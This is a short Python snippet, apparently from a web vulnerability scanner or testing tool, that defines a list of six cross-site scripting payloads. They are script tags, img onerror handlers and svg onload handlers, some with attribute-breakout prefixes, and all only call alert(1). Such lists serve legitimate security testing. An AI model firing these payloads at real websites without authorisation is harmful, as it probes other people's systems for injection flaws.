xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><svg/onload=alert(1)>'
]

# You can add additional XSS-specific functions here if needed
